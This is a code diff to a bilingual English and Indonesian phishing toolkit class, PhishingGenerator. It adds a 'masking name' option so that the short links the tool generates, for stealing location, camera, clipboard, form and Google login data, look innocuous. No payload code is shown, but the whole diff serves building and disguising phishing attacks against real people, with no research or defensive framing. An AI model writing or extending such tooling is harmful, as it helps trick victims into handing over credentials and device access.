@@ -1500,7 +1500,7 @@ class PhishingGenerator:
             
         console.print(menu)
 
-    def generate_phishing_link(self, phish_type, target_url=None):
+    def generate_phishing_link(self, phish_type, target_url=None, custom_text=None):
         """Generate link phishing dengan penanganan error yang lebih baik"""
         try:
             if not self.server_url:
@@ -1533,8 +1533,9 @@ class PhishingGenerator:
             with open(template_path, "w", encoding="utf-8") as f:
                 f.write(proxy_template)
                 
-            custom = console.input(f"\n[yellow][[?]] {'Custom short text (optional, enter to skip)' if self.language == 'en' else 'Custom teks pendek (opsional, enter untuk lewati)'}: [/]").strip()
+            custom = custom_text or ''
             if custom:
+                custom = custom.replace(' ', '')
                 self.short_links[custom] = phish_url
                 shortened_url = f"{self.server_url}/s/{custom}"
             else:
@@ -1607,73 +1608,82 @@ class PhishingGenerator:
                 
                 if choice == "1":
                     target = console.input(f"\n[yellow][[?]] {'Enter target URL' if self.language == 'en' else 'Masukkan URL target'}: [/]")
+                    mask = console.input(f"[yellow][[?]] {'Masking name (optional, no spaces allowed)' if self.language == 'en' else 'Nama masking (opsional, spasi tidak diperbolehkan)'}: [/]").strip()
                     with Progress() as progress:
                         task = progress.add_task("[cyan]Generating phishing link...", total=100)
-                        self.generate_phishing_link("location", target_url=target)
+                        self.generate_phishing_link("location", target_url=target, custom_text=mask)
                         progress.update(task, advance=100)
                     console.input(f"\n[green]{'Press Enter to continue...' if self.language == 'en' else 'Tekan Enter untuk melanjutkan...'}[/]")
                 
                 elif choice == "2":
                     target = console.input(f"\n[yellow][[?]] {'Enter target URL' if self.language == 'en' else 'Masukkan URL target'}: [/]")
+                    mask = console.input(f"[yellow][[?]] {'Masking name (optional, no spaces allowed)' if self.language == 'en' else 'Nama masking (opsional, spasi tidak diperbolehkan)'}: [/]").strip()
                     with Progress() as progress:
                         task = progress.add_task("[cyan]Generating phishing link...", total=100)
-                        self.generate_phishing_link("form", target_url=target)
+                        self.generate_phishing_link("form", target_url=target, custom_text=mask)
                         progress.update(task, advance=100)
                     console.input(f"\n[green]{'Press Enter to continue...' if self.language == 'en' else 'Tekan Enter untuk melanjutkan...'}[/]")
                 
                 elif choice == "3":
                     target = console.input(f"\n[yellow][[?]] {'Enter target URL' if self.language == 'en' else 'Masukkan URL target'}: [/]")
+                    mask = console.input(f"[yellow][[?]] {'Masking name (optional, no spaces allowed)' if self.language == 'en' else 'Nama masking (opsional, spasi tidak diperbolehkan)'}: [/]").strip()
                     with Progress() as progress:
                         task = progress.add_task("[cyan]Generating phishing link...", total=100)
-                        self.generate_phishing_link("camera", target_url=target)
+                        self.generate_phishing_link("camera", target_url=target, custom_text=mask)
                         progress.update(task, advance=100)
                     console.input(f"\n[green]{'Press Enter to continue...' if self.language == 'en' else 'Tekan Enter untuk melanjutkan...'}[/]")
                 
                 elif choice == "4":
                     target = console.input(f"\n[yellow][[?]] {'Enter target URL' if self.language == 'en' else 'Masukkan URL target'}: [/]")
+                    mask = console.input(f"[yellow][[?]] {'Masking name (optional, no spaces allowed)' if self.language == 'en' else 'Nama masking (opsional, spasi tidak diperbolehkan)'}: [/]").strip()
                     with Progress() as progress:
                         task = progress.add_task("[cyan]Generating phishing link...", total=100)
-                        self.generate_phishing_link("file", target_url=target)
+                        self.generate_phishing_link("file", target_url=target, custom_text=mask)
                         progress.update(task, advance=100)
                     console.input(f"\n[green]{'Press Enter to continue...' if self.language == 'en' else 'Tekan Enter untuk melanjutkan...'}[/]")
                 
                 elif choice == "5":
                     target = console.input(f"\n[yellow][[?]] {'Enter target URL' if self.language == 'en' else 'Masukkan URL target'}: [/]")
+                    mask = console.input(f"[yellow][[?]] {'Masking name (optional, no spaces allowed)' if self.language == 'en' else 'Nama masking (opsional, spasi tidak diperbolehkan)'}: [/]").strip()
                     with Progress() as progress:
                         task = progress.add_task("[cyan]Generating phishing link...", total=100)
-                        self.generate_phishing_link("clipboard", target_url=target)
+                        self.generate_phishing_link("clipboard", target_url=target, custom_text=mask)
                         progress.update(task, advance=100)
                     console.input(f"\n[green]{'Press Enter to continue...' if self.language == 'en' else 'Tekan Enter untuk melanjutkan...'}[/]")
                 
                 elif choice == "6":
                     target = console.input(f"\n[yellow][[?]] {'Enter target URL' if self.language == 'en' else 'Masukkan URL target'}: [/]")
+                    mask = console.input(f"[yellow][[?]] {'Masking name (optional, no spaces allowed)' if self.language == 'en' else 'Nama masking (opsional, spasi tidak diperbolehkan)'}: [/]").strip()
                     with Progress() as progress:
                         task = progress.add_task("[cyan]Generating phishing link...", total=100)
-                        self.generate_phishing_link("combo", target_url=target)
+                        self.generate_phishing_link("combo", target_url=target, custom_text=mask)
                         progress.update(task, advance=100)
                     console.input(f"\n[green]{'Press Enter to continue...' if self.language == 'en' else 'Tekan Enter untuk melanjutkan...'}[/]")
 
                 elif choice == "7":
                     target = console.input(f"\n[yellow][[?]] {'Enter target URL' if self.language == 'en' else 'Masukkan URL target'}: [/]")
+                    mask = console.input(f"[yellow][[?]] {'Masking name (optional, no spaces allowed)' if self.language == 'en' else 'Nama masking (opsional, spasi tidak diperbolehkan)'}: [/]").strip()
                     with Progress() as progress:
                         task = progress.add_task("[cyan]Generating phishing link...", total=100)
-                        self.generate_phishing_link("clickjack", target_url=target)
+                        self.generate_phishing_link("clickjack", target_url=target, custom_text=mask)
                         progress.update(task, advance=100)
                     console.input(f"\n[green]{'Press Enter to continue...' if self.language == 'en' else 'Tekan Enter untuk melanjutkan...'}[/]")
 
                 elif choice == "8":
                     target = console.input(f"\n[yellow][[?]] {'Enter target URL' if self.language == 'en' else 'Masukkan URL target'}: [/]")
+                    mask = console.input(f"[yellow][[?]] {'Masking name (optional, no spaces allowed)' if self.language == 'en' else 'Nama masking (opsional, spasi tidak diperbolehkan)'}: [/]").strip()
                     with Progress() as progress:
                         task = progress.add_task("[cyan]Generating phishing link...", total=100)
-                        self.generate_phishing_link("googleauth", target_url=target)
+                        self.generate_phishing_link("googleauth", target_url=target, custom_text=mask)
                         progress.update(task, advance=100)
                     console.input(f"\n[green]{'Press Enter to continue...' if self.language == 'en' else 'Tekan Enter untuk melanjutkan...'}[/]")
 
                 elif choice == "9":
                     target = console.input(f"\n[yellow][[?]] {'Enter target URL' if self.language == 'en' else 'Masukkan URL target'}: [/]")
+                    mask = console.input(f"[yellow][[?]] {'Masking name (optional, no spaces allowed)' if self.language == 'en' else 'Nama masking (opsional, spasi tidak diperbolehkan)'}: [/]").strip()
                     with Progress() as progress:
                         task = progress.add_task("[cyan]Generating phishing link...", total=100)
-                        self.generate_phishing_link("recaptcha", target_url=target)
+                        self.generate_phishing_link("recaptcha", target_url=target, custom_text=mask)
                         progress.update(task, advance=100)
                     console.input(f"\n[green]{'Press Enter to continue...' if self.language == 'en' else 'Tekan Enter untuk melanjutkan...'}[/]")
 
